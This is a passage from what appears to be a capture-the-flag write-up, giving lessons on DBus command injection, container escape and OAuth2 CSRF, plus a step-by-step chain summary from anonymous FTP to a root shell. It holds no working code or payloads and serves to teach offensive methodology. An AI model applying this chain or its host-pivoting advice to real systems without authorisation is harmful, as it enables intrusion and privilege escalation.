<li><p><strong>DBus services can be command injection vectors.</strong> Any service that constructs shell commands from user input is vulnerable, regardless of whether it uses HTTP, SQL, or DBus.</p>
</li>
<li><p><strong>Containers share resources with the host.</strong> DBus sockets, kernel interfaces, and network bridges can all be bridges out of a container if not properly isolated.</p>
</li>
</ol>
<h3 id="methodological-lessons">Methodological Lessons</h3>
<ol>
<li><p><strong>Follow the trust chain.</strong> OAuth2 is REDACTED trust delegation. Find where trust is assumed and question it.</p>
</li>
<li><p><strong>Read the source code (or infer it).</strong> The todo.txt hinted at SSH keys. The note.txt hinted at DBus. The <code>uwsgi.ini</code> showed the socket permissions. Configuration files are often more valuable than exploits.</p>
</li>
<li><p><strong>Be patient with bots.</strong> The contact form bot took 1-2 minutes to click links. In real engagements, automated processes (cron jobs, email parsers, message queues) often have delays.</p>
</li>
<li><p><strong>Pivot through the host.</strong> When direct connections from a container to your machine fail, use the compromised host as a pivot point. It's almost always on the same network as the containers.</p>
</li>
</ol>
<h3 id="the-complete-chain">The Complete Chain</h3>
<pre><code>Anonymous FTP -&gt; OAuth2 CSRF #1 (consumer) -&gt; Login as qtc
    -&gt; Developer creds -&gt; Malicious app registration
    -&gt; OAuth2 CSRF #2 (auth server) -&gt; Authorization code
    -&gt; Access token -&gt; /api/get_ssh -&gt; SSH as qtc
    -&gt; Docker container discovery -&gt; SSH into consumer container
    -&gt; uWSGI socket exploit -&gt; www-data shell
    -&gt; DBus command injection -&gt; Root shell
</code></pre>
